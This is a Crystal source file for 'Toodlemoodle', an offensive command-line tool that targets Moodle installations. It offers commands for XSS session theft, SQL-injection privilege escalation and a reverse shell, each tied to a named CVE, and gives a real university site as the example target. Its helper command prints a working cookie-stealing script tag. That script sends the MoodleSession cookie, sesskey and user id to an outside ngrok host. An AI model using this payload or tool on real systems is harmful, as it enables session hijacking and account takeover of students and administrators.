# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"
require "base64"
require "./actions/*"

module Toodlemoodle
  include TMoodleActions
  VERSION = "0.1.0"

  main = Main.new
  main.main

  class Main
    @command = ""
    @target = ""

    def main
      OptionParser.parse! do |parser|
        parser.banner = "Usage: tmoodle command [arguments]\n" \
                        "Commands:\nscan -- Scans the target, revealing the version and vulnerabilities.\n" \
                        "helper -- Prints a JavaScript to help extract your Moodle Session ID, Session Key, and User ID.\n" \
                        "dashboard_xss -- Inserts a session stealer on to your dashboard for the Admin hijack CVE-2019-3847.\n" \
                        "assignment_xss -- Specially crafted URLs to steal sessions using CVE-2017-2578.\n" \
                        "sql_injection -- Exploits CVE-2017-2641 to escalate a user's privelege.\n" \
                        "rce_shell -- Exploits CVE-2018-1133 (must be a teacher) to launch a reverse shell.\n"
        parser.separator("\nArguments:")
        parser.on("-t TARGET", "--target=TARGET", "Moodle target to attack. Do not include a slash at the end! Example: https://ole.unibz.it ") do |str|
          @target = str
        end
        # parser.on("-t NAME", "--to=NAME", "Specifies the name to target (ignore, for ref)") { |name| @destination = name }
        parser.on("-h", "--help", "Show this help message.") { puts parser }
        parser.invalid_option do |flag|
          STDERR.puts "ERROR: #{flag} is not a valid option.\n"
          STDERR.puts parser
          exit(1)
        end
        parser.unknown_args do |args|
          if args.size > 0
            @command = args[0]
          else
            STDERR.puts "ERROR: No command given.\n"
            STDERR.puts parser
            exit(1)
          end
        end
      end

      case @command
      when "scan"
        target_required()
        scanner = Scanner.new
        scanner.perform(@target)
      when "helper"
        puts "Copy and paste this into your DevTools console on an OLE page to extract your own session, session key, and user id.\n\nalert('MoodleSession: ' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '\\nSessKey: ' + M.cfg.sesskey + '\\nUser id: ' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid'))\n\n"
        puts "An example session stealer: \n" \
             "<script>document.write('<img src=\"https://5fc418e2.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '&sesskey=' + M.cfg.sesskey + '&id=' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid') + '\" />')</script>"
      when "dashboard_xss"
        target_required()
        dashboard_xss = DashboardXSS.new
        dashboard_xss.perform(@target)
      when "assignment_xss"
        target_required()
        assignment_xss = AssignmentXSS.new
        assignment_xss.perform(@target)
      when "sql_injection"
        target_required()
        sql_injection = SqlInjection.new
        sql_injection.perform(@target)
      when "rce_shell"
        # TODO: Riccardo
      else
        STDERR.puts "ERROR: Command \"#{@command}\" given does not exist.\n"
        # STDERR.puts @parser
        exit(1)
      end
    end

    def target_required
      if !@target
        STDERR.puts "ERROR: Please specify a target.\n"
        exit(1)
      end
    end
  end
end
